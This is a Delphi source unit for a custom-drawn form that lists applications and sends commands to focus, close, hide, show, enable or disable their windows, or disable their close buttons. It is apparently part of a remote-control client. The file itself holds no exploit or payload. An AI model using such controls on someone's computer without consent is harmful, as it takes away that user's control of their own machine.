unit winmUnit;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs, MainColors,
  ExtCtrls, StdCtrls, TFlatSpeedButtonUnit, TFlatCheckBoxUnit, OutlookBtn;

type
  TwinM = class(TForm)
    CaptionLabel: TLabel;
    CloseButton: TFlatSpeedButton;
    apps: TListBox;
    OutlookBtn1: TOutlookBtn;
    OutlookBtn2: TOutlookBtn;
    OutlookBtn3: TOutlookBtn;
    ShowAll: TFlatCheckBox;
    OutlookBtn4: TOutlookBtn;
    OutlookBtn5: TOutlookBtn;
    OutlookBtn6: TOutlookBtn;
    OutlookBtn7: TOutlookBtn;
    OutlookBtn8: TOutlookBtn;
    procedure FormCreate(Sender: TObject);
    procedure CloseButtonClick(Sender: TObject);
    procedure CaptionLabelMouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure CaptionLabelMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure CaptionLabelMouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure OutlookBtn1Click(Sender: TObject);
    procedure OutlookBtn2Click(Sender: TObject);
    procedure OutlookBtn3Click(Sender: TObject);
    procedure OutlookBtn4Click(Sender: TObject);
    procedure OutlookBtn5Click(Sender: TObject);
    procedure OutlookBtn6Click(Sender: TObject);
    procedure OutlookBtn7Click(Sender: TObject);
    procedure OutlookBtn8Click(Sender: TObject);
    procedure FormPaint(Sender: TObject);
    procedure FormResize(Sender: TObject);
  private
    procedure WMNCHitText(var Msg:TWMNCHitTest);message WM_NCHITTEST;
  public
    MouseDownSpot : TPoint;
    Capturing : bool;
    procedure SetTheColors;
  end;

var
  winM: TwinM;

implementation

uses MainUnit;

{$R *.DFM}

function Merge(x,y,x1,y1,x2,y2:integer):Boolean;
begin
 if ((x>=x1) and (x<=x2)) and ((y>=y1) and (y<=y2)) then result:=true else result:=false;
end;
var KeepX,KeepY:Integer;
procedure TwinM.WMNCHitText(var Msg:TWMNCHitTest);
const Corner=5;
      OffSet=3;
begin
  inherited;
 with winM,msg do begin
{  if (Merge(xpos,ypos ,Left+MinimizeButton.Left,Top+MinimizeButton.Top,Left+MinimizeButton.Left+MinimizeButton.Width,Top+MinimizeButton.Top+MinimizeButton.Height)) then exit;}
  if (Merge(xpos,ypos ,Left+CloseButton.Left,Top+CloseButton.Top,Left+CloseButton.Left+CloseButton.Width,Top+CloseButton.Top+CloseButton.Height)) then exit;
 end;
 if (Msg.Result = HTCLIENT) then
  with winM,msg do begin
  if (Merge(xpos,ypos ,Left         ,top+Corner        ,left+Offset       ,top+height-Corner)) then Result := htLeft;
  if (Merge(xpos,ypos ,Left+width-Offset ,top+Corner        ,left+width   ,top+height-Corner)) then Result := htRight;
  if (Merge(xpos,ypos ,Left+Corner       ,top          ,left+width-Corner ,top+Offset       )) then Result := htTop;
  if (Merge(xpos,ypos ,Left+Corner       ,top+height-Offset ,left+width-Corner ,top+height  )) then Result := htBottom;
  if (Merge(xpos,ypos ,Left,Top,Left+Corner,Top+Corner)) then Result:=htTopLeft;
  if (Merge(xpos,ypos ,Left+Width-Corner,Top,Left+Width,Top+Corner)) then Result:=htTopRight;
  if (Merge(xpos,ypos ,Left,Top+Height-Corner,Left+Corner,Top+Height)) then REsult:=htBottomLeft;
  if (Merge(xpos,ypos ,Left+Width-Corner,Top+Height-Corner,Left+Width,Top+Height)) then Result:=htBottomRight;
{  if (Merge(xpos,ypos ,Left+CaptionLabel.Left,Top+CaptionLabel.Top,Left+CaptionLabel.Left+CaptionLabel.Width,Top+CaptionLabel.Top+CaptionLabel.Height)) then Result:=htCaption;}
 end;
end;

procedure TwinM.SetTheColors;
begin
 CaptionLabel.Font.Color:=cFormText;
 CaptionLabel.Color:=cFormCaption;
 with CloseButton do begin
  Color:=cFormCaption;
  ColorBorder:=cFormCaption;
  Font.Color:=cFormText;
  ColorDown:=cFormBackground;
  ColorFocused:=cFormForeground;
  ColorHighlight:=cFormLine;
  ColorShadow:=cFormLine;
  Glyph.Assign(MainForm.bit_close_btn);
  NumGlyphs:=2;
  Caption:='';
 end;
 with ShowAll do begin Color:=cFormBackground;ColorCheck:=cFormText;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with apps do begin Color:=cFormForeground;Font.Color:=cFormText;end;
 Invalidate;
end;

procedure TwinM.FormCreate(Sender: TObject);
begin
 Tag:=12;Left:=(Screen.Width-Width) div 2; Top:=(Screen.Height-Height) div 2;
 if MainForm.ReadKey(IntToStr(Tag)+'_x')<>'' then Left:=StrToInt(MainForm.ReadKey(IntToStr(Tag)+'_x'));
 if MainForm.ReadKey(IntToStr(Tag)+'_y')<>'' then Top:=StrToInt(MainForm.ReadKey(IntToStr(Tag)+'_y'));
 if MainForm.ReadKey(IntToStr(Tag)+'_h')<>'' then Height:=StrToInt(MainForm.ReadKey(IntToStr(Tag)+'_h'));
 if MainForm.ReadKey(IntToStr(Tag)+'_w')<>'' then Width:=StrToInt(MainForm.ReadKey(IntToStr(Tag)+'_w'));
 SetTheColors;
end;

procedure TwinM.CloseButtonClick(Sender: TObject);
begin
 Hide;
end;

procedure TwinM.CaptionLabelMouseDown(Sender: TObject;
  Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
begin
 SetCapture(CaptionLabel.Parent.Handle);
 Capturing := true;
 MouseDownSpot.X := x;
 MouseDownSpot.Y := Y;
end;


procedure TwinM.CaptionLabelMouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
begin
if Capturing then with CaptionLabel.Parent do begin
 Left := Left - (MouseDownSpot.x - x);
 Top := Top - (MouseDownSpot.y - y);
end;
end;

procedure TwinM.CaptionLabelMouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
if Capturing then with CaptionLabel.Parent do begin
 ReleaseCapture;
 Capturing := false;
 Left := Left - (MouseDownSpot.x - x);
 Top := Top - (MouseDownSpot.y - y);
end;
end;

procedure TwinM.OutlookBtn1Click(Sender: TObject);
begin
 if ShowAll.Checked then MainForm.SendCommand('RAWON','refreshing...','1.3') else
  MainForm.SendCommand('RAW','refreshing...','1.3')
end;

procedure TwinM.OutlookBtn2Click(Sender: TObject);
begin
 with apps do
  MainForm.SendCommand('FCW'+IntToStr(ItemIndex+1),'focusing <'+Items[ItemIndex]+'>...','1.1');
end;

procedure TwinM.OutlookBtn3Click(Sender: TObject);
begin
 with apps do
  MainForm.SendCommand('CAW'+IntToStr(ItemIndex+1),'closing <'+Items[ItemIndex]+'>...','1.1');
end;

procedure TwinM.OutlookBtn4Click(Sender: TObject);
begin
 with apps do
  MainForm.SendCommand('DCB'+IntToStr(ItemIndex+1),'trying to disable X for <'+Items[ItemIndex]+'>...','1.1');
end;

procedure TwinM.OutlookBtn5Click(Sender: TObject);
begin
 with apps do
  MainForm.SendCommand('SWN'+IntToStr(ItemIndex+1),'showing <'+Items[ItemIndex]+'>...','1.2');
end;

procedure TwinM.OutlookBtn6Click(Sender: TObject);
begin
 with apps do
  MainForm.SendCommand('HWN'+IntToStr(ItemIndex+1),'hiding <'+Items[ItemIndex]+'>...','1.2');
end;

procedure TwinM.OutlookBtn7Click(Sender: TObject);
begin
 with apps do
  MainForm.SendCommand('EAW'+IntToStr(ItemIndex+1),'trying to enable <'+Items[ItemIndex]+'>...','1.1');
end;

procedure TwinM.OutlookBtn8Click(Sender: TObject);
begin
 with apps do
  MainForm.SendCommand('DAW'+IntToStr(ItemIndex+1),'trying to disable <'+Items[ItemIndex]+'>...','1.1');
end;

procedure TwinM.FormPaint(Sender: TObject);
var i:integer;
begin
 for i:=24  to Height-5 do Canvas.CopyRect(bounds(0,i,4,1),MainForm.bit_window.canvas,bounds(1,26,4,1));
 for i:=24 to Height-5 do Canvas.CopyRect(bounds(Width-4,i,4,1),MainForm.bit_window.canvas,bounds(48,26,4,1));
 for i:=24 to Width-24 do Canvas.CopyRect(bounds(i,0,1,24),MainForm.bit_window.canvas,bounds(26,1,1,24));
 for i:=4 to Width-4 do Canvas.CopyRect(bounds(i,Height-4,1,4),MainForm.bit_window.canvas,bounds(26,28,1,4));
 Canvas.CopyRect(bounds(0,0,24,24),MainForm.bit_window.canvas,bounds(1,1,24,24));
 Canvas.CopyRect(bounds(Width-24,0,24,24),MainForm.bit_window.canvas,bounds(28,1,24,24));
 Canvas.CopyRect(bounds(0,Height-4,4,4),MainForm.bit_window.canvas,bounds(1,28,4,4));
 Canvas.CopyRect(bounds(Width-4,Height-4,4,4),MainForm.bit_window.canvas,bounds(48,28,4,4));
 Canvas.Brush.Color:=MainForm.BackgroundColor;
 Canvas.FillRect(Bounds(4,24,width-8,height-28));
end;

procedure TwinM.FormResize(Sender: TObject);
begin
 Invalidate;
end;

end.
